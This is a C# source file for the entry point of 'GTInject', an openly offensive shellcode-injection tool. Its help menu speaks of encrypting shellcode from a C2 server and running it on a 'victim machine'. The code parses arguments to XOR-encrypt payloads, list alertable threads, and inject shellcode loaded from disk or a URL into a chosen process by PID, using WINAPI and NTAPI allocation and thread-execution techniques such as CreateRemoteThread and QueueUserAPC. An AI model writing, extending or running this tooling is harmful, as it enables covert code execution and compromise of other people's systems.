using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Globalization;
using GTInject.memoryOptions;
using GTInject.Injection;
using System.Diagnostics;

namespace GTInject
{
    internal class Inject
    {
        public enum sourceLocation
        {
            embedded,
            url,
            disk
        }
        public enum execCommands
        {
            threads,
            inject,
            encrypt,
            help
        }
  
        static void Main(string[] args)
        {
            var command = args[0];
            var enumcommandparse = Enum.TryParse<execCommands>(command, true, out var enumresult);
            if (!(enumcommandparse))
            {
                Console.WriteLine("Not a valid command, try GTInject.exe help\n");
            }
            else if (command.ToLower() == "help") 
            {
                string helptext = @"
GTInject.exe Help Menu

Usage: GTInject.exe <command> <commandArgs>
       GTInject.exe threads
       GTInject.exe encrypt pathToSource.bin MySecretXorKey
       GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID

       GTInject.exe inject 100 100 SecretKey123 disk ""C:\path\to\xordShellcode.file\"" 1234 321

Encrypt  -- for encrypting shellcode:
        Shellcode from your C2 will be multibyte XOR'd and written as a base64 string in a text file
        This is intended to help you use the injection option later
        This is also my utility for encrypting payloads to be used in shellcode runners

        Do this in preparation, not on the C2 victim machine.

Threads  -- check for alertable threads:
        This will list all threads and their current execution state
        This is intended to help identify alertable threads, for injection options.

Inject   -- choose a process injection method
        Choose a technique for allocating the memory
        Then choose a technique for executing the thread
        Enter the XorKey to decrypt it with
        Specify a location type where the encrypted shellcode is stored 
        Specify the location
        Specify the PID

100 Series - WINAPI
200 Series - NTAPI 
300 Series - Syscalls
400 Series - Misc Techniques

Memory Options
        100. WINAPI -- VirtualAllocEx, WriteProcessMemory
        200. NTAPI  -- NtCreateSection, NtMapViewOfSection, RtlCopyMemory

ThreadExec Options
        100. WINAPI -- CreateRemoteThread
        101. WINAPI -- QueueUserAPC & ResumeThread
        200. NTAPI  -- NtCreateThreadEx
";
                Console.WriteLine(helptext);
             }

            else if (command.ToLower() == "encrypt")
            {
                string binPath = null;
                string xorkey = null;
                try
                {
                    binPath = args[1];
                    xorkey = args[2];
                }
                catch
                {
                    Console.WriteLine( " You didn't include the needed arguments for GTInject.exe encrypt <sourceBinPath> <yourXorKeyString>");
                }
                EncryptBin.EncryptBin.EncryptShellcode(binPath, xorkey);
            }

            else if (command.ToLower() == "threads")
            {
                AlertableThreads.Alertable.GetThreads();
            }

            else if (command.ToLower() == "inject")
            {
                //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
                int memOption = 0;
                int execOption = 0;
                string xorkey = "0x00";
                string binSrcType = "";
                string binSrcPath = "";
                int Pid = 0;
                int Tid = 0;
                int resultvar = 0;
                try
                {
                    memOption = int.Parse(args[1]); //Int.TryParse(args[1]);
                    execOption = int.Parse(args[2]);
                    xorkey = args[3];
                    binSrcType = args[4];
                    binSrcPath = args[5];
                    Pid = int.Parse(args[6]);
                    try
                    {
                        Tid = int.Parse(args[7]);
                    }
                    catch (IndexOutOfRangeException ex)
                    {
                        Console.WriteLine( " Tid not entered as an arg, not an issue at this point, just catch to handle the exception");
                        //Tid = 0;
                    }
                }
                catch (Exception ex) {
                    Console.WriteLine($"Other exception : {ex.Message}");
                }
                IntPtr memoryResponse = IntPtr.Zero;
                Process pidResp = null;
                (memoryResponse, pidResp) = memory.SelectMemOption(memOption, execOption, xorkey, binSrcType, binSrcPath, Pid, Tid);
                if (memoryResponse == IntPtr.Zero) { Console.WriteLine(" And you may ask yourself, 'well, how did I get here?', Leeting the days go by "); }
                else
                {
                    threadexec.SelectThreadOption(memoryResponse, execOption, pidResp, Tid);
                }
            }
 
        }
    }
}
